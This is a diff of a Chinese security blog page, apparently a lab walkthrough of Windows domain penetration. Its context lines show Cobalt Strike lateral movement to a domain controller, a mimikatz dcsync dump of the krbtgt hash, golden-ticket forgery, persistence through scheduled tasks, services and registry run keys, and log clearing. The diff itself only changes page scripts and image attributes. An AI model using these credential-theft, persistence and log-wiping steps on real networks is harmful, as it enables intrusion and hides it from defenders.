 <h4 id="扫描内网网段"><!-- raw HTML omitted -->扫描内网网段<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#扫描内网网段">#</a></h4>
 <p><code>portscan 192.168.138.0/24 </code></p>
-<p><img decoding="async" height="1129" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458679.png" style="max-width: 100%; height: auto; aspect-ratio: 1111 / 1129;" width="1111"></p>
+<p><img decoding="async" height="1129" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458679.png" style="max-width: 100%; height: auto; aspect-ratio: 1111 / 1129;" width="1111"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="内网横向移动"><!-- raw HTML omitted -->内网横向移动<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#内网横向移动">#</a></h1>
 <h2 id="psexec64连接域控"><!-- raw HTML omitted -->psexec64连接域控<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#psexec64连接域控">#</a></h2>
@@ -2071,28 +2067,28 @@ win7  外网 IP： 192.168.135.150
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --> 配置监听器<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted --> 由于域控通常在内网深处，无法直接连接 Kali 外网 IP，创建一个 <!-- raw HTML omitted --><strong>SMB Beacon</strong><!-- raw HTML omitted --> 监听器  <!-- raw HTML omitted --></p>
-<p><img decoding="async" height="912" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500818.png" style="max-width: 100%; height: auto; aspect-ratio: 657 / 912;" width="657"></p>
+<p><img decoding="async" height="912" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500818.png" style="max-width: 100%; height: auto; aspect-ratio: 657 / 912;" width="657"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->接下来在 <!-- raw HTML omitted --><strong><!-- raw HTML omitted -->视图-&gt;目标列表<!-- raw HTML omitted --></strong></p>
 <p>就可以看到域控了：</p>
-<p><img decoding="async" height="825" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458517.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 825;" width="1176"></p>
+<p><img decoding="async" height="825" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458517.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 825;" width="1176"></p>
 <p><strong><!-- raw HTML omitted -->右键-&gt;横向移动-&gt;psexec64<!-- raw HTML omitted --></strong></p>
-<p><img decoding="async" height="825" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459876.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 825;" width="1176"></p>
+<p><img decoding="async" height="825" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459876.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 825;" width="1176"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->填入账号密码，选择监听器<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="587" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456116.png" style="max-width: 100%; height: auto; aspect-ratio: 1729 / 587;" width="1729"></p>
+<p><img decoding="async" height="587" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456116.png" style="max-width: 100%; height: auto; aspect-ratio: 1729 / 587;" width="1729"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->选择会话<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="587" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456646.png" style="max-width: 100%; height: auto; aspect-ratio: 1850 / 587;" width="1850"></p>
+<p><img decoding="async" height="587" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456646.png" style="max-width: 100%; height: auto; aspect-ratio: 1850 / 587;" width="1850"></p>
 <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->成功控制域控机器<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1493" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500749.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1493;" width="2560"></p>
+<p><img decoding="async" height="1493" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500749.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1493;" width="2560"></p>
 <h1 id="权限维持">权限维持<a hidden class="anchor" aria-hidden="true" href="#权限维持">#</a></h1>
 <h3 id="1-域控专属黄金票据-golden-ticket--最隐蔽">1. 域控专属：黄金票据 (Golden Ticket) —— 最隐蔽<a hidden class="anchor" aria-hidden="true" href="#1-域控专属黄金票据-golden-ticket--最隐蔽">#</a></h3>
 <p>这是域渗透的“终极权限”。只要拿到域内 <code>krbtgt</code> 用户的哈希，你就可以伪造任何用户的身份（包括域管），且不受密码修改的影响。</p>
 <h4 id="域内-krbtgt-用户的哈希">域内 <code>krbtgt</code> 用户的哈希<a hidden class="anchor" aria-hidden="true" href="#域内-krbtgt-用户的哈希">#</a></h4>
 <p>在域控的 Beacon 上运行：<code>hashdump</code> 或 <code>mimikatz lsadump::dcsync /domain:SUN.COM /user:krbtgt</code>。
-<img decoding="async" height="952" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456555.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 952;" width="1176"></p>
+<img decoding="async" height="952" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456555.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 952;" width="1176"></p>
 <blockquote>
 <p><code>**krbtgt:502:aad3b435b51404eeaad3b435b51404ee:65dc23a67f31503698981f2665f9d858:::**</code></p>
 <p>数据的格式是：<code>用户名 : RID : LM哈希 : NTLM哈希 :::</code></p>
@@ -2106,25 +2102,25 @@ win7  外网 IP： 192.168.135.150
 <h4 id="域-sid-获取-shell-whoami-user">域 SID 获取： <code>shell whoami /user</code><a hidden class="anchor" aria-hidden="true" href="#域-sid-获取-shell-whoami-user">#</a></h4>
 <p>这里会出现一个问题，因为当前已经处于 <code>**SYSTEM**</code> 权限（SID 为 <code>S-1-5-18</code>），它是本地系统的最高权限，<strong>但它不是域用户，所以通过它查不到域的 SID</strong>。</p>
 <p>要获取域 SID，我们需要查询域内用户的信息。</p>
-<p><img decoding="async" height="952" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459167.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 952;" width="1176"></p>
+<p><img decoding="async" height="952" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459167.png" style="max-width: 100%; height: auto; aspect-ratio: 1176 / 952;" width="1176"></p>
 <p><strong>最简单的 WMI 查询</strong>： <code>shell wmic useraccount where name='Administrator' get sid</code></p>
 <p><strong>查询域控制器信息</strong>： <code>shell net group &quot;domain admins&quot; /domain</code></p>
-<p><img decoding="async" height="700" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459442.png" style="max-width: 100%; height: auto; aspect-ratio: 1198 / 700;" width="1198"></p>
+<p><img decoding="async" height="700" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459442.png" style="max-width: 100%; height: auto; aspect-ratio: 1198 / 700;" width="1198"></p>
 <p>获得 SID：<code>S-1-5-21-3388020223-1982701712-4030140183</code>  （要去掉后面的 500）</p>
 <h4 id="黄金票据">黄金票据<a hidden class="anchor" aria-hidden="true" href="#黄金票据">#</a></h4>
-<p><img decoding="async" height="711" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459236.png" style="max-width: 100%; height: auto; aspect-ratio: 709 / 711;" width="709"></p>
-<p><img decoding="async" height="379" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458321.png" style="max-width: 100%; height: auto; aspect-ratio: 540 / 379;" width="540"></p>
-<p><img decoding="async" height="1493" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456737.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1493;" width="2560"></p>
+<p><img decoding="async" height="711" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459236.png" style="max-width: 100%; height: auto; aspect-ratio: 709 / 711;" width="709"></p>
+<p><img decoding="async" height="379" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458321.png" style="max-width: 100%; height: auto; aspect-ratio: 540 / 379;" width="540"></p>
+<p><img decoding="async" height="1493" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456737.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1493;" width="2560"></p>
 <p><code>Golden ticket for 'krbtgt @ SUN.COM' successfully submitted for current session</code>，说明 Mimikatz 已经成功伪造了这张黄金票据，并将其直接塞进了当前 Beacon 进程的内存里。</p>
-<p><img decoding="async" height="544" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458838.png" style="max-width: 100%; height: auto; aspect-ratio: 859 / 544;" width="859"></p>
-<p><img decoding="async" height="1021" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456432.png" style="max-width: 100%; height: auto; aspect-ratio: 995 / 1021;" width="995"></p>
+<p><img decoding="async" height="544" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458838.png" style="max-width: 100%; height: auto; aspect-ratio: 859 / 544;" width="859"></p>
+<p><img decoding="async" height="1021" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456432.png" style="max-width: 100%; height: auto; aspect-ratio: 995 / 1021;" width="995"></p>
 <blockquote>
 <p>用 CS 工具确实比 msf 手注方便不少啊 &mdash;</p>
 </blockquote>
 <h3 id="2-系统级维持计划任务-scheduled-tasks--最常用">2. 系统级维持：计划任务 (Scheduled Tasks) —— 最常用<a hidden class="anchor" aria-hidden="true" href="#2-系统级维持计划任务-scheduled-tasks--最常用">#</a></h3>
 <p>利用 Windows 的 <code>schtasks</code> 定时运行你的木马。</p>
 <p><strong>Beacon 命令</strong>：</p>
-<div class="code-block-container" id="code-1779933344482547700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344482547700">
+<div class="code-block-container" id="code-1779947699670041200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699670041200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -2136,12 +2132,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344482547700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344482547700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699670041200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699670041200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344482547700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699670041200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -2158,7 +2154,7 @@ win7  外网 IP： 192.168.135.150
 <h3 id="3-服务维持-service-persistence--权限最高">3. 服务维持 (Service Persistence) —— 权限最高<a hidden class="anchor" aria-hidden="true" href="#3-服务维持-service-persistence--权限最高">#</a></h3>
 <p>创建一个开机自启动的服务，由于服务通常以 <code>SYSTEM</code> 权限运行，稳定性极高。</p>
 <p><strong>Beacon 命令</strong>：</p>
-<div class="code-block-container" id="code-1779933344483060700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344483060700">
+<div class="code-block-container" id="code-1779947699670537700" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699670537700">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -2170,12 +2166,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344483060700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344483060700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699670537700" title="Toggle" aria-expanded="false" aria-controls="code-1779947699670537700" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344483060700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699670537700-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -2193,7 +2189,7 @@ win7  外网 IP： 192.168.135.150
 <h3 id="4-注册表维持-registry-run-keys">4. 注册表维持 (Registry Run Keys)<a hidden class="anchor" aria-hidden="true" href="#4-注册表维持-registry-run-keys">#</a></h3>
 <p>修改注册表的启动项，用户每次登录时都会触发木马。</p>
 <p><strong>命令</strong>：</p>
-<div class="code-block-container" id="code-1779933344483060700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344483060700">
+<div class="code-block-container" id="code-1779947699670537700" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699670537700">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -2205,12 +2201,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344483060700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344483060700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699670537700" title="Toggle" aria-expanded="false" aria-controls="code-1779947699670537700" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344483060700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699670537700-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -2220,7 +2216,7 @@ win7  外网 IP： 192.168.135.150
 </div></div>
 </div><h1 id="日志清除"><!-- raw HTML omitted -->日志清除<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#日志清除">#</a></h1>
 <p><!-- raw HTML omitted -->日志清除有两种方法，一种是使用kali里面自带的命令进行日志清除<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344483060700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344483060700">
+<div class="code-block-container" id="code-1779947699670537700" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699670537700">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -2232,12 +2228,12 @@ win7  外网 IP： 192.168.135.150
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344483060700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344483060700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699670537700" title="Toggle" aria-expanded="false" aria-controls="code-1779947699670537700" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344483060700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699670537700-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -2250,7 +2246,7 @@ win7  外网 IP： 192.168.135.150
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted -->第二种方法则是进入服务器管理器自行清除<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="716" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457591.png" style="max-width: 100%; height: auto; aspect-ratio: 968 / 716;" width="968"></p>
+<p><img decoding="async" height="716" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457591.png" style="max-width: 100%; height: auto; aspect-ratio: 968 / 716;" width="968"></p>
 
 
   </div>
@@ -2688,13 +2684,24 @@ document.addEventListener('DOMContentLoaded', function() {
     var overlay = document.getElementById('lightbox-overlay');
     if (!overlay) return;
     var lbImg = overlay.querySelector('.lightbox-img');
+    var prevBtn = overlay.querySelector('.lightbox-prev');
+    var nextBtn = overlay.querySelector('.lightbox-next');
+    var images = Array.from(document.querySelectorAll('.post-content img'));
+    var currentIndex = 0;
 
-    document.querySelectorAll('.post-content img').forEach(function(img) {
+    function showImage(index) {
+        if (!images.length) return;
+        currentIndex = (index + images.length) % images.length;
+        var img = images[currentIndex];
+        lbImg.src = img.currentSrc || img.src;
+        lbImg.alt = img.alt || '';
+    }
+
+    images.forEach(function(img, index) {
         img.style.cursor = 'zoom-in';
         img.addEventListener('click', function(e) {
             e.preventDefault();
-            lbImg.src = this.src;
-            lbImg.alt = this.alt || '';
+            showImage(index);
             overlay.classList.add('active');
             overlay.setAttribute('aria-hidden', 'false');
             document.body.style.overflow = 'hidden';
@@ -2707,12 +2714,27 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.style.overflow = '';
     }
 
+    function isOpen() {
+        return overlay.classList.contains('active');
+    }
+
     overlay.addEventListener('click', function(e) {
-        if (e.target !== lbImg) closeLightbox();
+        if (e.target !== lbImg && !e.target.closest('.lightbox-nav')) closeLightbox();
     });
     overlay.querySelector('.lightbox-close').addEventListener('click', closeLightbox);
+    prevBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        showImage(currentIndex - 1);
+    });
+    nextBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        showImage(currentIndex + 1);
+    });
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape' && overlay.classList.contains('active')) closeLightbox();
+        if (!isOpen()) return;
+        if (e.key === 'Escape') closeLightbox();
+        if (e.key === 'ArrowLeft') showImage(currentIndex - 1);
+        if (e.key === 'ArrowRight') showImage(currentIndex + 1);
     });
 })();
 </script>
@@ -3069,88 +3091,6 @@ document.addEventListener('DOMContentLoaded', function() {
 (function() {
     if (window.innerWidth < 768) return;
 
-    var IDLE_MS = 10000;
-    var timer = null;
-    var visible = false;
-
-    
-    var cat = document.createElement('div');
-    cat.setAttribute('aria-hidden', 'true');
-    cat.style.cssText = 'position:fixed;bottom:-60px;right:40px;z-index:9997;pointer-events:none;'
-        + 'transition:bottom .6s cubic-bezier(.34,1.56,.64,1);will-change:bottom';
-
-    
-    cat.innerHTML = '<svg viewBox="0 0 120 100" width="120" height="100" xmlns="http://www.w3.org/2000/svg">'
-        
-        + '<ellipse cx="38" cy="88" rx="12" ry="7" fill="var(--primary)" opacity=".18"/>'
-        + '<ellipse cx="82" cy="88" rx="12" ry="7" fill="var(--primary)" opacity=".18"/>'
-        + '<path d="M28 90 Q30 78 38 76 Q46 78 48 90" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.5"/>'
-        + '<path d="M72 90 Q74 78 82 76 Q90 78 92 90" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.5"/>'
-        
-        + '<ellipse cx="38" cy="85" rx="3" ry="2" fill="var(--primary)" opacity=".25"/>'
-        + '<ellipse cx="82" cy="85" rx="3" ry="2" fill="var(--primary)" opacity=".25"/>'
-        
-        + '<ellipse cx="60" cy="52" rx="28" ry="24" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8"/>'
-        
-        + '<path d="M36 38 L30 14 L48 30 Z" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8" stroke-linejoin="round"/>'
-        + '<path d="M84 38 L90 14 L72 30 Z" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8" stroke-linejoin="round"/>'
-        
-        + '<path d="M37 35 L33 18 L46 31 Z" fill="var(--primary)" opacity=".12"/>'
-        + '<path d="M83 35 L87 18 L74 31 Z" fill="var(--primary)" opacity=".12"/>'
-        
-        + '<g class="idle-cat-eyes">'
-        + '<ellipse cx="48" cy="50" rx="5" ry="5.5" fill="var(--primary)"/>'
-        + '<ellipse cx="72" cy="50" rx="5" ry="5.5" fill="var(--primary)"/>'
-        + '<ellipse cx="49" cy="48.5" rx="2" ry="2" fill="var(--secondary)"/>'
-        + '<ellipse cx="73" cy="48.5" rx="2" ry="2" fill="var(--secondary)"/>'
-        + '</g>'
-        
-        + '<path d="M58 56 L60 59 L62 56 Z" fill="var(--primary)" opacity=".5"/>'
-        
-        + '<path d="M60 59 Q56 63 52 60" fill="none" stroke="var(--primary)" stroke-width="1.2" stroke-linecap="round" opacity=".45"/>'
-        + '<path d="M60 59 Q64 63 68 60" fill="none" stroke="var(--primary)" stroke-width="1.2" stroke-linecap="round" opacity=".45"/>'
-        
-        + '<line x1="20" y1="52" x2="42" y2="54" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="20" y1="58" x2="42" y2="58" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="78" y1="54" x2="100" y2="52" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="78" y1="58" x2="100" y2="58" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '</svg>';
-
-    document.body.appendChild(cat);
-
-    function show() {
-        if (visible) return;
-        visible = true;
-        cat.style.bottom = '-10px';
-    }
-
-    function hide() {
-        if (!visible) return;
-        visible = false;
-        cat.style.bottom = '-60px';
-    }
-
-    function resetTimer() {
-        hide();
-        clearTimeout(timer);
-        timer = setTimeout(show, IDLE_MS);
-    }
-
-    ['mousemove', 'mousedown', 'keydown', 'scroll', 'touchstart'].forEach(function(evt) {
-        document.addEventListener(evt, resetTimer, { passive: true });
-    });
-
-    timer = setTimeout(show, IDLE_MS);
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    if (window.innerWidth < 768) return;
-
     var MAX_DEG = 4;
 
     document.querySelectorAll('.post-entry').forEach(function(card) {
@@ -3251,45 +3191,6 @@ document.addEventListener('DOMContentLoaded', function() {
             localStorage.setItem("pref-theme", 'dark');
         }
     })
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerHTML = 'copy';
-
-        function copyingDone() {
-            copybutton.innerHTML = 'copied!';
-            setTimeout(() => {
-                copybutton.innerHTML = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try { document.execCommand('copy'); copyingDone(); } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
 </script>
 </body>
 
